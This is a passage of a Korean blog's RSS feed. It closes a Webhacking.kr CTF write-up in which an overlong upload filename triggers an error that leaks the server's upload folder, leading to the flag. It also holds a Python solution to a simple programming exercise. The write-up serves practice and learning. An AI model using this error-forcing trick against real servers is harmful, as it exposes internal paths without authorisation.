filename=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span><br><span class="line"><span class="attribute">Content-Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryamSoOBSPCV58OK7l--</span><br></pre></td></tr></table></figure><p>255글자로 파일명을 지정하여 업로드를 진행하였다.</p><p><img src="/images/pasted-422.png"><br>에러가 발생하지 않았다.</p><p>이제 256글자로 파일명을 지정하여 업로드를 진행하였다.<br><img src="/images/pasted-423.png"><br>에러가 발생되었다.<br><br>에러 메시지가 출력되어서 업로드 폴더명이 유출되었다.</p><p>파일명을 test로 하여 업로드 후 test를 출력해보겠다.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryJBfUcczUZgDMbNiR</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name=&quot;up&quot;; filename=&quot;test&quot;</span><br><span class="line"><span class="attribute">Content-Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryJBfUcczUZgDMbNiR--</span><br></pre></td></tr></table></figure><p>업로드를 진행 후, 업로드 폴더에 있는 파일을 요청했다.</p><p><img src="/images/pasted-424.png" alt="https://webhacking.kr/challenge/web-19/4b0e87fef7b5e8ba83894970c9806042e5d6ec9a/test"><br>Flag를 얻을 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/20/Webhacking-kr-Old-41-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 두 정수 사이의 합</title>
      <link>https://lrtk-coder.github.io/2021/05/20/Programmers-Level-1-%EB%91%90-%EC%A0%95%EC%88%98-%EC%82%AC%EC%9D%B4%EC%9D%98-%ED%95%A9/</link>
      <guid>https://lrtk-coder.github.io/2021/05/20/Programmers-Level-1-%EB%91%90-%EC%A0%95%EC%88%98-%EC%82%AC%EC%9D%B4%EC%9D%98-%ED%95%A9/</guid>
      <pubDate>Thu, 20 May 2021 19:22:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;두-정수-사이의-합&quot;&gt;&lt;a href=&quot;#두-정수-사이의-합&quot; class=&quot;headerlink&quot; title=&quot;두 정수 사이의 합&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/less</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="두-정수-사이의-합"><a href="#두-정수-사이의-합" class="headerlink" title="두 정수 사이의 합"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12912">두 정수 사이의 합</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>두 정수 a, b가 주어졌을 때 a와 b 사이에 속한 모든 정수의 합을 리턴하는 함수, solution을 완성하세요.<br><br>예를 들어 a = 3, b = 5인 경우, 3 + 4 + 5 = 12이므로 12를 리턴합니다.</p><h2 id="제한-조건"><a href="#제한-조건" class="headerlink" title="제한 조건"></a>제한 조건</h2><ul><li>a와 b가 같은 경우는 둘 중 아무 수나 리턴하세요.</li><li>a와 b는 -10,000,000 이상 10,000,000 이하인 정수입니다.</li><li>a와 b의 대소관계는 정해져있지 않습니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><p>구현 문제로, 반복문과 Range 함수를 이용하여 풀이를 하였다.</p><ul><li><p>방법1<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">a:<span class="built_in">int</span>, b:<span class="built_in">int</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == b:</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    </span><br><span class="line">    start = <span class="built_in">min</span>(a, b)</span><br><span class="line">    end = <span class="built_in">max</span>(a, b)</span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end+<span class="number">1</span>):</span><br><span class="line">        total += i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> total</span><br></pre></td></tr></table></figure></li><li><p>방법2<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">a:<span class="built_in">int</span>, b:<span class="built_in">int</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> a &gt; b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(<span class="built_in">range</span>(a, b+<span class="number">1</span>))</span><br></pre></td></tr></table></figure><p>방법1를 간소화 시킨 방법이다.<br><br>방법2처럼 반복문을 사용하지 않고 sum 함수로만 진행한다면, <code>a==b</code>조건은 range 함수에서 자동으로 해결하기 때문에 코드의 길이가 줄어졌다.</p></li><li><p>방법3<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">a:<span class="built_in">int</span>, b:<span class="built_in">int</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">abs</span>(a-b)+<span class="number">1</span>)*(a+b)//<span class="number">2</span></span><br></pre></td></tr></table></figure><p>등차수열의 합 공식을 이용한 방법이다.<br><br>시간복잡도가 O(1)로 최상의 성능 가진 코드이다.</p></li></ul>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/20/Programmers-Level-1-%EB%91%90-%EC%A0%95%EC%88%98-%EC%82%AC%EC%9D%B4%EC%9D%98-%ED%95%A9/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
